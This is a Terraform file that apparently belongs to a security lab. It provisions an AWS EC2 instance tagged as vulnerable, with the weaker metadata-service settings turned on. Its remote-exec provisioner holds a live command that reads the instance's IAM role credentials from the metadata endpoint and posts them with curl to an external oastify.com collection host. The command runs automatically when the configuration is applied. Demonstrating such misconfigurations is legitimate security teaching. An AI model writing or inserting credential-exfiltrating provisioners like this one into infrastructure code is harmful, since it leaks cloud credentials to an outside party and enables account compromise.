# provide an option to enable this module
# if the variable "enabled" is true create a simple ec2 instance

module "network" {
  source = "../network"
}
resource "aws_instance" "remote-exec-example" {
  count = var.remoteexec_enabled ? 1 : 0
  ami           = "ami-06ca3ca175f37dd66"
  instance_type = "t2.micro"
  vpc_security_group_ids = [module.network.r2dso-lab-sg]
  subnet_id = module.network.r2dso-lab-subnet

  associate_public_ip_address = true

  tags = {
      Name = "r2dso-lab-instance-remoteexec"
      Vulnerable = "true"
  }

  provisioner "remote-exec" {
    inline = [
      "sudo yum install ec2-instance-connect -y",
      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://URL.oastify.com/creds.php --data-urlencode creds@/tmp/awscreds.txt"
    ]
  }

  iam_instance_profile = "tf-testing-role"

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = var.priv_key
    host        = self.public_ip
    agent       = false
  }

  key_name = var.key_name

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 10
  }

}

# if the variable "enabled" is true create a simple ec2 instance
# resource "aws_instance" "r2dso-lab_instance" {
#     count = var.enabled ? 1 : 0
#     ami = "ami-0b69ea66ff7391e80" // Amazon Linux 2 AMI (HVM), SSD Volume Type
#     instance_type = "t2.micro"
#     key_name = var.key_name
#     vpc_security_group_ids = [module.network.r2dso-lab-sg]
#     subnet_id = module.network.r2dso-lab-subnet
#     associate_public_ip_address = true

#     tags = {
#         Name = "r2dso-lab-instance"
#     }
# }
output "public_ip_remoteexec" {
  value = aws_instance.remote-exec-example[0].public_ip
}